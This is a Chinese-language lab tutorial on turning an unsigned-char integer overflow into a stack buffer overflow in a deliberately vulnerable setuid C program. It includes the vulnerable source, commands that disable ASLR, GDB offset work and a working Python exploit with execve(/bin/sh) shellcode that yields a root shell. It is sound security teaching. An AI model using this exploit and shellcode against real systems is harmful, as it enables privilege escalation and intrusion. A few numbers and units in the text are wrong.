# 环境
ubuntu 14.04 i386

# 知识准备
## GDB工具的熟练使用

## 整型溢出原理


### 数据类型大小和范围：
![image](http://on44nkxjb.bkt.clouddn.com/18-3-25/85085692.jpg)

### 整型上溢出
存储的数值大于支持的最大上限值，即为整型溢出。整型溢出本身不会直接导致任意代码执行，但是它会导致栈溢出或堆溢出，而后两者都会导致任意代码执行。
### 整型下溢出
与整型上溢出类似，存储数值小于支持的最小下限值，即为整型下溢出。打个比方，如果我们把-2147483649存进有符号整型数据，那么这串数字就会错乱，其值会变为21471483647。这就叫做整型下溢出。

### 整数溢出的影响
存放整数的变量就如同一个小盒子，放进去的数目太大，倍数太多，而导致有一部分数溢出而丢失，造成里面的数目并不是你的目标值，但要注意，这个不同于栈溢出，它不会直接造成任意代码执行的严重后面，只是数值会超乎想象地突变。


    

## 栈的工作过程

## 局部变量在栈内的分布

# 实验过程

## 漏洞程序

vuln.c:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void store_passwd(char *passwd){

}
void validate_uname(char *uname)
{

}
void validate_passwd(char *passwd)
{
    char passwd_buf[11];
    unsigned char passwd_len = strlen(passwd);
    if(passwd_len >= 4 && passwd_len <=8)
    {
        printf("Valid Passwd\n");
        fflush(stdout);
        strcpy(passwd_buf,passwd);
    }else
    {
        printf("Invalid Passwd\n");
        fflush(stdout);
    }
    store_passwd(passwd_buf);
}
int main(int argc, char *argv[])
{
    if(argc != 3)
    {
        printf("Usage Error:\n");
        fflush(stdout);
        exit(-1);
    }
    validate_uname(argv[1]);
    validate_passwd(argv[2]);
    return 0;
}

```
### 编译

```
# 关闭ASLR （需要root执行）
echo 0 > /proc/sys/kernel/randomize_va_space
gcc -g -o vuln -fno-stack-protector -z execstack vuln.c
sudo chown root:root vuln
# 添加Setuid权限，是为了可以提权获得root权限的Shell
sudo chmod +s vuln

```
### 栈内布局
观察栈内而局最直接的方式还是通过汇编层来查看。

通过GDB反编译或objdump的获得相应的汇编代码。

这里，为了动态调试方便 ，还是采用GDB来查看汇编，以此来分析栈内布局。


```
gdb-peda$ disassemble validate_passwd
Dump of assembler code for function validate_passwd:
   0x08048507 <+0>:	push   ebp
   0x08048508 <+1>:	mov    ebp,esp
   0x0804850a <+3>:	sub    esp,0x28
   0x0804850d <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048510 <+9>:	mov    DWORD PTR [esp],eax
   0x08048513 <+12>:	call   0x80483e0 <strlen@plt>
   0x08048518 <+17>:	mov    BYTE PTR [ebp-0x9],al
   0x0804851b <+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x0804851f <+24>:	jbe    0x8048554 <validate_passwd+77>
   0x08048521 <+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x08048525 <+30>:	ja     0x8048554 <validate_passwd+77>
   0x08048527 <+32>:	mov    DWORD PTR [esp],0x8048670
   0x0804852e <+39>:	call   0x80483b0 <puts@plt>
   0x08048533 <+44>:	mov    eax,ds:0x804a040
   0x08048538 <+49>:	mov    DWORD PTR [esp],eax
   0x0804853b <+52>:	call   0x8048390 <fflush@plt>
   0x08048540 <+57>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048543 <+60>:	mov    DWORD PTR [esp+0x4],eax
   0x08048547 <+64>:	lea    eax,[ebp-0x14]
   0x0804854a <+67>:	mov    DWORD PTR [esp],eax
   0x0804854d <+70>:	call   0x80483a0 <strcpy@plt>
   0x08048552 <+75>:	jmp    0x804856d <validate_passwd+102>
   0x08048554 <+77>:	mov    DWORD PTR [esp],0x804867d
   0x0804855b <+84>:	call   0x80483b0 <puts@plt>
   0x08048560 <+89>:	mov    eax,ds:0x804a040
   0x08048565 <+94>:	mov    DWORD PTR [esp],eax
   0x08048568 <+97>:	call   0x8048390 <fflush@plt>
   0x0804856d <+102>:	lea    eax,[ebp-0x14]
   0x08048570 <+105>:	mov    DWORD PTR [esp],eax
   0x08048573 <+108>:	call   0x80484fd <store_passwd>
   0x08048578 <+113>:	leave  
   0x08048579 <+114>:	ret    
End of assembler dump.

```

![image](http://on44nkxjb.bkt.clouddn.com/18-4-1/90566995.jpg)



### 溢出过程分析

在validate_passwd函数中，需要数组passwd_buf有大小长度的限制，但问题就出在使用unsighed char 类型存放int类型长度，这两种数值的范围是不同的，passwd_len过小，易超出范围而造成溢出，凑巧的是当发生整型溢出时，恰好又符号判断条件，这样就可能绕过条件校验，仍有可能以passwd_buf进行溢出利用。


那么，什么情况下能发生溢出符合校验条件，又能对passwd_buf进行溢出利用呢，可以通过下面一个小程序来测试一下：


overflow_test.c
```
#include <stdio.h>

int main(int argc, char *argv[])
{
    int i = 0;
    unsigned char m;
    for (i = 0; i < 1000; ++i) {
        m = i;
       if(m>=4 && m<=8) 
       {
           printf("test ok: %d\n",i );
       }
    }
    return 0;
}

```
编译运行：

```
 gcc -o test overflow_test.c 
 
  ./test 
test ok: 4
test ok: 5
test ok: 6
test ok: 7
test ok: 8
test ok: 260
test ok: 261
test ok: 262
test ok: 263
test ok: 264
test ok: 516
test ok: 517
test ok: 518
test ok: 519
test ok: 520
test ok: 772
test ok: 773
test ok: 774
test ok: 775
test ok: 776

```
说明在1000以内，符号条件的长度值有以上几组，意味着，向passwd_buf放入长度是260～264等时，既可对passwd_buf溢出，又可以绕过条件限制。


那么，passwd_buf到返回地址的偏移是多少呢？还是需要借助GDB动态计算一下，
先计算EBP到passwd_buf的偏移，再加一个4就是passwd_buf到返回地址之间的偏移值了。


```
gdb-peda$ p /x &passwd_buf
$4 = 0xbf8dd054
gdb-peda$ p 0xbf8dd068 - 0xbf8dd054 + 0x4
$6 = 0x18

```
偏移值就是0x18,即24个字节长度

测试验证：

```
gdb-peda$ r funny `python -c 'print "A"*24 + "B"*4 + "c"*232'`

[----------------------------------registers-----------------------------------]
EAX: 0xbf97c424 ('A' <repeats 24 times>, "BBBB", 'c' <repeats 172 times>...)
EBX: 0xb773b000 --> 0x1aada8 
ECX: 0xbf97d860 --> 0x58006363 ('cc')
EDX: 0xbf97c526 --> 0xde006363 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbf97c440 ('c' <repeats 200 times>...)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbf97c440 ('c' <repeats 200 times>...)
0004| 0xbf97c444 ('c' <repeats 200 times>...)
0008| 0xbf97c448 ('c' <repeats 200 times>...)
0012| 0xbf97c44c ('c' <repeats 200 times>...)
0016| 0xbf97c450 ('c' <repeats 200 times>...)
0020| 0xbf97c454 ('c' <repeats 200 times>...)
0024| 0xbf97c458 ('c' <repeats 200 times>...)
0028| 0xbf97c45c ('c' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()


```
注： 这里以数组长度为260为例，进行溢出测试，可以看出，正好EIP变成了EIP: 0x42424242 ('BBBB')，代表之间算出的偏移距离是正确的。


## 攻击程序

exploit.py
```
#!/usr/bin/env python

import struct
from subprocess import call 

arg1 = "hello"

ret_addr = 0xbffff594


# shellcode 
# execve(/bin/sh)
# len : 25bit
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
def conv(num):
    return struct.pack("<I",num)

arg2 = "A" * 24
arg2 += conv(ret_addr)
arg2 += "\x90" * 100
arg2 += scode
arg2 += "C" * 107

print "Calling vulnerable program"
call(["./vuln",arg1, arg2])
```
攻击程序的关键点是覆盖返回地址时，使用的地址是哪个？首先按passwd_buf到返回地址存放位置的偏移值确认溢出内容的存放次序，即

```
arg2 = "A" * 24
arg2 += conv(ret_addr)
arg2 += "\x90" * 100
arg2 += scode
arg2 += "C" * 107  #确保arg2总长度是260


```
scode的起始地址就根据存放次序来确定，这里是以passwd_buf为起点，scode的偏移是24+4+100 ，即128个字节距离。那么在GDB中就很容易计算出来返回地址的覆盖内容是：

gdb-peda$ p &passwd_buf
$2 = (char (*)[11]) 0xbffff514
gdb-peda$ p 0xbffff514+0x80
$3 = 0xbffff594

```
那么攻击程序中ret_addr的值就是0xbffff594

## 攻击测试

```
magc@magc-VirtualBox:~/workspace/sec_experiements99/6_experiment$ vim exploit.py 
magc@magc-VirtualBox:~/workspace/sec_experiements99/6_experiment$ python exploit.py 
Calling vulnerable program
Valid Passwd
#     
```

由提示符可以看到$变成#，得到一个Root权限的Shell,攻击成功






# 参考
- https://strcpy.me/index.php/archives/776/
- [整型溢出](http://www.csyssec.org/20161230/integerflow/)


